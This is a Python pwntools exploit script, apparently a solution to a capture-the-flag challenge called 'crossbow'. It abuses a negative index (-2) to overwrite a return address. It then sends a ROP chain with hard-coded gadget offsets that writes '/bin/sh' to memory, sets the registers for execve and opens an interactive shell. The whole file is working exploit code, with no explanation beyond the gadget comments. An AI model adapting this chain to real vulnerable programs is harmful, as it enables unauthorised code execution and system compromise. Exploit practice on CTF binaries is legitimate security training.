#!/usr/bin/env python3

from pwn import *
from struct import pack

elf = context.binary = ELF('./crossbow')
context.terminal = ['x-terminal-emulator', '-e']
pr = process('./crossbow')

# We send -2 to overwrite a rip pointer
pr.sendlineafter(b"Select target to shoot:", b"-2")

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000
rebase = lambda x : p(x + IMAGE_BASE_0)

rop = b''
rop += rebase(0x1001)  # pop rax; ret;
rop += b'/bin/sh\x00'
rop += rebase(0x1d6c)  # pop rdi; ret;
rop += rebase(0xe000)
rop += rebase(0x20f5)  # mov [rdi], rax; ret;
rop += rebase(0x1d6c)  # pop rdi; ret;
rop += rebase(0xe000)
rop += rebase(0x566b)  # pop rsi; ret;
rop += p(0x0)          # explicitly set RSI = NULL 
rop += rebase(0x1139)  # pop rdx; ret;
rop += p(0x0)          # explicitly set RDX = NULL
rop += rebase(0x1001)  # pop rax; ret;
rop += p(0x3b)
rop += rebase(0x4b51)  # syscall; ret;
print(rop)

payload = flat(
    b"A" * 8, # padding 
    rop
)

pr.sendlineafter(b"> ", payload)
pr.interactive()
